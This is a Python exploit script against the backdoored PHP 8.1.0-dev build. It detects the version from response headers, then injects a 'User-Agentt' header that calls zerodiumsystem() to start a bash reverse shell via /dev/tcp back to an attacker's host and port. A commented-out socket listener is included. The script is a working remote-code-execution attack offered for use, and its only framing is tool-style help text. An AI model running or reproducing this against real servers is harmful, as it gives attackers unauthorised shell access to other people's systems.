
import argparse, os, sys, requests, socket, io, time

# buffer_size = 1024 * 128

request = requests.Session()

def check_vulnerability(args):
    response = request.get(args.URL)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

#def listen(args):
    #LPORT_TO_INT = int(args.LPORT)

    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.bind((args.LHOST, LPORT_TO_INT))
    #s.listen(1)
    #print("Listening on", args.LHOST + ":" + args.LPORT, "...")
    #conn, addr = s.accept()
    #print("Connection recieved from", addr)

    #while True:
    #    ans = conn.recv(buffer_size).decode()
    #    sys.stdout.write(ans)
    #    command = input()
    #    command += "\n"
    #    conn.send(command.encode())
    #    time.sleep(1)
    #    sys.stdout.write("\033[A" + ans.split("\n")[-1])

# Exploit code
def rev_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.LHOST + '/' + args.LPORT + ' 0>&1\"'
    injection = request.get(args.URL, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)


def main():
    parser = argparse.ArgumentParser(description="'PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution' exploit script.")
    parser.add_argument("-u", "--URL", metavar='--URL https://<TARGET_IP_ADDRESS>',help="Set the target machine's IP address.")
    parser.add_argument("-p", "--RPORT", metavar='--RPORT https://<RECEIVING_PORT>', help="Set the target port, default is 80.")
    parser.add_argument("-H","--LHOST", metavar='--URL https://<IP_ADDRESS>', help="Set the attacking machine's IP address.")
    parser.add_argument("-l", "--LPORT", metavar='--URL https://<LISTENING_PORT>', help="Set the attacking machine's listening port.")
    args = parser.parse_args()

    if check_vulnerability(args):
        print("[*] Successful exploitation!")
        #listen(args)
        rev_shell(args)
        
    else:
        print("[!] Target is either unavailable or not vulnerable, aborting... ")

if __name__ == "__main__":
    main()
    
    
